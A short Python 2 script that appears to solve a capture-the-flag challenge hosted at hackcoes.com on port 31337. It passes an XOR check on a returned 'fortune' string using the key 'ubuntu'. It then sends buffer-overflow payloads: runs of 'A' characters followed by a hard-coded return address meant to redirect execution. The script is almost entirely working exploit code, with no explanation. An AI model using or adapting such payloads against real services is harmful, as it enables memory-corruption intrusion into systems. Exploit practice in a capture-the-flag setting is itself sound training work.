import socket
import os
import sys
pad = "ubuntu"
def ttt(s):
        ret = []
        for i in range(len(s)):
                tmp = ord(s[i]) ^ ord(pad[i%len(pad)])
                ret.append(chr(tmp))
        return "".join(ret)

def getFortune(fortune):
	
	return fortune.split("*Here's your fortune!*")[1].split("\n\nGive me your edits.\n")[0].split("\n\n")[1]


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("hackcoes.com",31337))

whoRu = s.recv(1024)
print whoRu

s.send("ubuntu")
greeting = s.recv(2048)
print greeting

fortune = s.recv(1024)
print fortune

#fortune = fortune.splitlines()[-3]
fortune = getFortune(fortune)
print fortune

fortune = fortune+"\n"
output = ttt(fortune)
print output
print "fortune len",len(fortune)
print "output len",len(output)
s.send(bytearray(output))
print s.recv(1024)

print s.recv(1024)
new_password = "A"*155#+"\x82\x91\x04\x08"
s.send(bytearray(new_password))

print s.recv(1024)
password = "A"*20+ "\x82\x91\x04\x08" #"\x73\x8B\x04\x08"

s.send(bytearray(password))


print s.recv(1024)
print s.recv(1024)

print s.recv(1024)
print s.recv(1024)



